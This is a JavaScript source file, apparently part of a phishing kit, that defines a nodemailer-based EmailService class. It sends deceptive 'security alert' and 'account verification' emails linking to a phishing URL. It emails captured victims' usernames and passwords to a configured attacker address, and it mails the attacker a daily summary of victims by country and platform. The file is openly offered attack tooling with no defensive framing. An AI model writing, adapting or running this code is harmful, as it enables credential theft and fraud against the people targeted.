hereconst nodemailer = require('nodemailer');

class EmailService {
    constructor(config) {
        this.config = config;
        this.transporter = null;
        this.init();
    }

    init() {
        this.transporter = nodemailer.createTransport({
            host: this.config.smtpHost,
            port: this.config.smtpPort,
            secure: this.config.secure,
            auth: {
                user: this.config.smtpUser,
                pass: this.config.smtpPass
            }
        });
    }

    async sendPhishingEmail(targetEmail, templateData) {
        const emailTemplate = this.generatePhishingTemplate(templateData);
        
        const mailOptions = {
            from: this.config.fromEmail,
            to: targetEmail,
            subject: emailTemplate.subject,
            html: emailTemplate.html,
            text: emailTemplate.text
        };

        try {
            const result = await this.transporter.sendMail(mailOptions);
            console.log('Phishing email sent:', result.messageId);
            return { success: true, messageId: result.messageId };
        } catch (error) {
            console.error('Email sending failed:', error);
            return { success: false, error: error.message };
        }
    }

    generatePhishingTemplate(templateData) {
        const templates = {
            security_alert: {
                subject: "🔒 Urgent Security Alert - Action Required",
                html: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <style>
                            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
                            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                            .header { background: #dc3545; color: white; padding: 20px; text-align: center; }
                            .content { background: #f8f9fa; padding: 20px; border: 1px solid #dee2e6; }
                            .button { display: inline-block; padding: 12px 24px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; }
                            .footer { text-align: center; padding: 20px; color: #6c757d; font-size: 12px; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <div class="header">
                                <h1>🚨 Security Alert</h1>
                            </div>
                            <div class="content">
                                <p>Dear User,</p>
                                <p>We've detected unusual activity on your account from a new device. For your security, we need to verify your identity.</p>
                                <p><strong>Device Details:</strong><br>
                                • Location: ${templateData.location}<br>
                                • Browser: ${templateData.browser}<br>
                                • Time: ${new Date().toLocaleString()}</p>
                                <p style="text-align: center;">
                                    <a href="${templateData.phishingUrl}" class="button">Verify Your Identity Now</a>
                                </p>
                                <p>If this wasn't you, please secure your account immediately.</p>
                            </div>
                            <div class="footer">
                                <p>This is an automated security message. Please do not reply.</p>
                            </div>
                        </div>
                    </body>
                    </html>
                `,
                text: `Security Alert: Unusual activity detected on your account. Verify your identity: ${templateData.phishingUrl}`
            },

            account_verification: {
                subject: "✅ Account Verification Required",
                html: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <style>
                            body { font-family: Arial, sans-serif; }
                            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                            .verify-btn { background: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h2>Account Verification Required</h2>
                            <p>To continue using your account, we need to verify your identity.</p>
                            <p><a href="${templateData.phishingUrl}" class="verify-btn">Verify Account</a></p>
                            <p><small>This verification helps protect your account from unauthorized access.</small></p>
                        </div>
                    </body>
                    </html>
                `,
                text: `Verify your account: ${templateData.phishingUrl}`
            }
        };

        return templates[templateData.type] || templates.security_alert;
    }

    async sendCredentialsToAttacker(victimId, credentials) {
        const mailOptions = {
            from: this.config.fromEmail,
            to: this.config.attackerEmail,
            subject: `🔑 New Credentials Captured - ${victimId}`,
            html: `
                <h2>New Credentials Captured</h2>
                <p><strong>Victim ID:</strong> ${victimId}</p>
                <p><strong>Username:</strong> ${credentials.username}</p>
                <p><strong>Password:</strong> ${credentials.password}</p>
                <p><strong>Source:</strong> ${credentials.source}</p>
                <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
            `
        };

        return this.transporter.sendMail(mailOptions);
    }

    async sendSummaryReport(victimsData) {
        let htmlContent = `
            <h1>📊 Daily Attack Summary</h1>
            <p><strong>Date:</strong> ${new Date().toDateString()}</p>
            <h2>Victims Summary</h2>
            <table border="1" style="border-collapse: collapse; width: 100%;">
                <tr>
                    <th>Victim ID</th>
                    <th>Country</th>
                    <th>Platform</th>
                    <th>Data Collected</th>
                    <th>Status</th>
                </tr>
        `;

        victimsData.forEach(victim => {
            htmlContent += `
                <tr>
                    <td>${victim.id}</td>
                    <td>${victim.country}</td>
                    <td>${victim.platform}</td>
                    <td>${victim.dataCount} items</td>
                    <td>${victim.status}</td>
                </tr>
            `;
        });

        htmlContent += `</table>`;

        const mailOptions = {
            from: this.config.fromEmail,
            to: this.config.attackerEmail,
            subject: `📈 Daily Summary - ${victimsData.length} Victims`,
            html: htmlContent
        };

        return this.transporter.sendMail(mailOptions);
    }
}

module.exports = EmailService;
